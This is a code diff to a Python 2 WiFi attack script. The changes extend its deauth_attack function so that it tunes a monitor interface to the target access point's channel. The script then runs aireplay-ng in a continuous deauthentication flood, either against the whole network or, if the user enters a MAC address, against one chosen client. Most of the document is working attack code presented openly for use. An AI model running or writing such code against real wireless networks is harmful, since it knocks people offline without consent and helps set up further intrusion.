@@ -4,8 +4,10 @@ import time
 import os
 import sys
 
+
 def deauth_attack(AP_info, attack_type):
-    target_bssid = str(AP_info['bssid'])
+    target_bssid   = str(AP_info['bssid'])
+    target_channel = int(AP_info['channel'])
     print "[-] initiating deauth. . ."
     if attack_type == 1:
         print "[-] attack mode: attacks in multiple cycles with wait intervals in between"
@@ -23,7 +25,21 @@ def deauth_attack(AP_info, attack_type):
             time.sleep(interval)
     elif attack_type ==2:
         print "[-] attack mode: continously send deauth packets"
-        os.system('aireplay-ng --deauth 0  -a %s -D  wlan0mon' % (target_bssid))
+        os.system('iwconfig mon7 channel %d' %(target_channel))
+        time.sleep(4)
+        print "[-] this attack is more effective if client's MAC addr is known, can you enter the MAC adddr"
+        print "[-] enter y/n\n[->] ",
+        while True:
+            response = str(raw_input())
+            if response == 'y' or response == 'Y':
+                mac = str(raw_input("enter the MAC addr \n[->]"))
+                os.system('aireplay-ng --deauth 0  -a %s -c %s  mon7' %(target_bssid,mac))
+                break
+            elif response == 'n' or response == 'N':
+                os.system('aireplay-ng --deauth 0  -a %s -D  mon7' % (target_bssid))
+                break
+            else:
+                print "[ERROR] wrong input,enter again (y/n)\n[->] ",
 
 
 
